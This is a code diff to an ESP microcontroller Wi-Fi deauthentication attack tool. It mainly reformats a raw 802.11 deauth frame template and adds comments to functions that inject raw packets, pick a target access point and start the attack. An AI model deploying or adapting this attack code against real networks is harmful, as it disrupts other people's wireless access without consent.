@@ -26,38 +26,23 @@ int Deauth::randomIndex;
  */
 
 uint8_t Deauth::deauthTemp[26] = {
-    /*  0 - 1  */ 0xC0,
-    0x00, // Type, subtype: c0 => deauth, a0 => disassociate
-    /*  2 - 3  */ 0x00,
-    0x00, // Duration (handled by the SDK)
-    /*  4 - 9  */ 0xFF,
-    0xFF,
-    0xFF,
-    0xFF,
-    0xFF,
-    0xFF, // Reciever MAC (To)
-    /* 10 - 15 */ 0xCC,
-    0xCC,
-    0xCC,
-    0xCC,
-    0xCC,
-    0xCC, // Source MAC (From)
-    /* 16 - 21 */ 0xCC,
-    0xCC,
-    0xCC,
-    0xCC,
-    0xCC,
-    0xCC, // BSSID MAC (From)
-    /* 22 - 23 */ 0x00,
-    0x00, // Fragment & squence number
-    /* 24 - 25 */ 0x01,
-    0x00 // Reason code (1 = unspecified reason)
+    /*  0 - 1  */ 0xC0, 0x00, // Type, subtype: c0 => deauth, a0 => disassociate
+    /*  2 - 3  */ 0x00, 0x00, // Duration (handled by the SDK)
+    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Reciever MAC (To)
+    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source MAC (From)
+    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID MAC (From)
+    /* 22 - 23 */ 0x00, 0x00, // Fragment & squence number
+    /* 24 - 25 */ 0x01, 0x00 // Reason code (1 = unspecified reason)
 };
 
 uint8_t Deauth::deauthFrame[26];
 uint8_t Deauth::disassociateFrame[26];
 uint8_t Deauth::broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
+/**
+ * Adds SSIDs (or BSSIDs) to the whitelist
+ * @param bssids SSIDs/BSSIDs to whitelist
+ */
 void Deauth::add(const std::string &bssids) {
   std::stringstream ss(bssids);
   std::string token;
@@ -77,12 +62,21 @@ void Deauth::add(const std::string &bssids) {
   }
 }
 
+/**
+ * Adds everything to the whitelist
+ */
 void Deauth::list() {
   for (const auto &bssid : Config::whitelist) {
     Deauth::add(bssid);
   }
 }
 
+/**
+ * Sends a packet
+ * @param buf Packet to send
+ * @param len Length of packet
+ * @param sys_seq Ignore this, just make it false
+ */
 bool Deauth::send(uint8_t *buf, uint16_t len, bool sys_seq) {
   // apparently will not work with 0 on regular, fixed on spacehuhn
   bool sent = wifi_send_pkt_freedom(buf, len, sys_seq) == 0;
@@ -91,9 +85,11 @@ bool Deauth::send(uint8_t *buf, uint16_t len, bool sys_seq) {
   return sent;
 }
 
-// check if this is a broadcast
-// source:
-// https://github.com/SpacehuhnTech/esp8266_deauther/blob/v2/esp8266_deauther/functions.h#L334
+/**
+ * Check if packet source address is a broadcast
+ * source: https://github.com/SpacehuhnTech/esp8266_deauther/blob/v2/esp8266_deauther/functions.h#L334
+ * @param mac Mac address to check
+ */
 bool Deauth::broadcast(uint8_t *mac) {
   for (uint8_t i = 0; i < 6; i++) {
     if (mac[i] != broadcastAddr[i])
@@ -103,12 +99,24 @@ bool Deauth::broadcast(uint8_t *mac) {
   return true;
 }
 
+/**
+ * Format Mac Address as a String, then print it
+ * @param mac Address to print
+ */
 void Deauth::printMac(uint8_t *mac) {
   String macStr = printMacStr(mac);
   Serial.println(macStr);
   Display::updateDisplay("('-')", "AP BSSID: " + macStr);
 }
 
+/**
+ * Checks if a network is hidden
+ * Instead of having an integer being 
+ * returned from WiFi.isHidden(),
+ * we make a string out of it and return it here.
+ * Sadly the ESP32 doesn't support this for some reason.
+ * @param network Network to check from index 
+ */
 String Deauth::printHidden(int network) {
   String hidden;
   bool check = WiFi.isHidden(network);
@@ -122,6 +130,10 @@ String Deauth::printHidden(int network) {
   return hidden;
 }
 
+/**
+ * Function meant to print Mac as a String used in printMac()
+ * @param mac Mac to use
+ */
 String Deauth::printMacStr(uint8_t *mac) {
   char buf[18]; // 17 for MAC, 1 for null terminator
   snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1],
@@ -129,6 +141,9 @@ String Deauth::printMacStr(uint8_t *mac) {
   return String(buf);
 }
 
+/**
+ * Selects an AP to deauth, returns a boolean based on if the scan and selection was successful
+ */
 bool Deauth::select() {
   // reset values
   Deauth::randomAP = "";
@@ -311,6 +326,9 @@ bool Deauth::select() {
   return false;
 }
 
+/**
+ * Full deauthentication attack
+ */
 void Deauth::deauth() {
   if (Config::deauth) {
     // select AP
@@ -349,6 +367,9 @@ void Deauth::deauth() {
   }
 }
 
+/**
+ * Starts deauth attack
+ */
 void Deauth::start() {
   running = true;
   int deauthFrameSize = sizeof(deauthFrame);
